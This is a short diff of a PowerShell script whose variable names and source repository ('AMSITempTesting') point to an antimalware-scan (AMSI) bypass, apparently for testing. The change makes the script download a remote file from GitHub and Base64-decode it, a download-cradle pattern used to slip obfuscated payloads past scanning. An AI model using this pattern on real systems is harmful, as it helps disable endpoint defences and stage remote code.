@@ -1,2 +1,3 @@
-$jonsbypass = (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/SecurityJon/AMSITempTesting/master/stage5.txt");
+$jonsbypassencoded = (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/SecurityJon/AMSITempTesting/master/stage5.txt");
+$jonsbypass = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($jonsbypassencoded))
 $jonsbypass;
